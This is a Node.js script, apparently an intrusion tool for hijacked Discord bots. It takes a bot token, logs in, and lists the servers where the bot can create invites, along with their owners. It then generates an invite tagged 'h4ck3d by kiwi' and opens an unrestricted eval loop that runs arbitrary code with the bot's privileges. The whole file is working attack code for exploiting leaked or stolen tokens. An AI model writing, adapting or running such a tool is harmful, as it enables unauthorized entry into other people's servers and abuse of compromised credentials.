const Discord = require('discord.js');
const client = new Discord.Client();
const { prompt } = require('inquirer')

client.on('ready', () => {
    console.log('Ready !')
    console.log(`Connected as ${client.user.username}#${client.user.discriminator} (id : ${client.user.id})`)

	const guilds = client.guilds.cache
		.filter(guild => guild.member(client.user).hasPermission('CREATE_INSTANT_INVITE'))
		.map(({id, name, owner}) => `${id} - ${name} (owned by ${owner.user.username})`);
	
	guilds.unshift("Aucun")

    getGuild(guilds).then(({guild: id}) => {
		if(id == 'Aucun'){
			console.log("Tu as choisi de ne pas générer d'invitation")
			customEval();
			return;
		}
		const guild = client.guilds.resolve(id);
		guild.systemChannel.createInvite({reason: "h4ck3d by kiwi"}).then(invite => {
			console.log(`Invite link : ${invite.url}`);
			customEval()
		})
	
	});

})

function customEval(){
	prompt([
		{
			name:"content",
			message:"eval :"
		}
	]).then(({content}) => {
		try{
			console.log(eval(content));
		}catch(exception){
			console.log(exception)
		}
		customEval()
	})
}

const getGuild = (guilds) => {
    return prompt([
		{
			name: "guild",
			type: 'list',
			message: 'Select a guild to invite :',
			filter,
			choices: guilds,
		}
	])
}

function filter(str) {
	return str.split(' ')[0]
}

prompt([{name:"token",message:"token :"}])
	.then(({token}) => client.login(token).catch(() => console.log("invalid token !")));